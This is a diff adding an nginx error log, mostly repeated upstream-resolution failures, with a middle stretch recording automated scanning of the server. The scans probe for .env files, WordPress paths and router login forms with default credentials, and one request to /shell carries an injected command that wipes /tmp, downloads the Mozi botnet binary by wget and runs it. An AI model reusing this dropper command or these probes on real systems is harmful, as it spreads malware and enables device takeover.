@@ -1,0 +1,95 @@
+2022/01/08 03:28:23 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:28:29 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:28:35 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:28:42 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:28:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:28:55 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:05 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:27 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:33 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:39 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:51 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:29:59 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:30:08 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:31:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:31:51 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:31:57 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:35:07 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:35:13 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 03:35:19 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:24:43 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:24:49 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:24:55 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:25:02 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:25:08 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:25:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:25:54 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:00 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:07 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:14 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:21 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:30 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:26:42 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:27:01 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:27:32 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:28:29 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 04:29:35 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 06:12:13 [error] 7#7: *5 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.62.197.62, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 06:53:17 [error] 7#7: *6 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 82.151.123.60, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+2022/01/08 08:03:44 [error] 7#7: *7 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 157.230.104.160, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 08:06:06 [error] 7#7: *8 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
+2022/01/08 08:06:06 [error] 7#7: *9 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 08:49:00 [error] 7#7: *10 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 182.127.164.49, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0"
+2022/01/08 09:17:55 [error] 7#7: *12 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.195, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 09:17:55 [error] 7#7: *13 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.195, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 09:33:29 [error] 7#7: *14 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 175.107.0.62, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
+2022/01/08 09:33:30 [error] 7#7: *15 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 128.14.141.34, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 10:22:51 [error] 7#7: *17 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 92.118.161.49, server: 0.0.0.0, request: "GET / HTTP/1.0"
+2022/01/08 11:36:07 [error] 7#7: *22 open() "/etc/nginx/html/shell" failed (2: No such file or directory), client: 120.85.112.4, server: 0.0.0.0, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 11:49:17 [error] 7#7: *23 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
+2022/01/08 11:49:17 [error] 7#7: *24 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 12:26:49 [error] 7#7: *25 open() "/etc/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 120.85.113.82, server: 0.0.0.0, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
+2022/01/08 12:29:27 [error] 7#7: *28 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 12:29:48 [error] 7#7: *29 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80"
+2022/01/08 12:29:48 [error] 7#7: *30 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "44.195.238.80"
+2022/01/08 12:29:49 [error] 7#7: *31 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /sitemap.xml HTTP/1.1", host: "44.195.238.80"
+2022/01/08 12:58:35 [error] 7#7: *32 open() "/etc/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.53.74, server: 0.0.0.0, request: "GET /config/getuser?index=0 HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/blog/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/web/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wordpress/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/website/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/news/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/2020/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/2019/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/shop/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp1/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/test/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp2/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/site/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/cms/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/sito/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
+2022/01/08 14:22:27 [error] 7#7: *34 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
+2022/01/08 14:22:28 [error] 7#7: *35 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 14:53:51 [error] 7#7: *37 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.44.57.232, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 14:58:40 [error] 7#7: *38 open() "/etc/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.53.74, server: 0.0.0.0, request: "GET /config/getuser?index=0 HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 15:24:16 [error] 7#7: *39 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 143.244.154.242, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
+2022/01/08 15:24:16 [error] 7#7: *40 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 143.244.154.242, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
+2022/01/08 17:08:29 [error] 7#7: *41 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 195.144.235.42, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
+2022/01/08 18:10:05 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:11 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:17 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:23 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:30 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:37 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:46 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:10:58 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:11:17 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:11:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
+2022/01/08 18:12:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
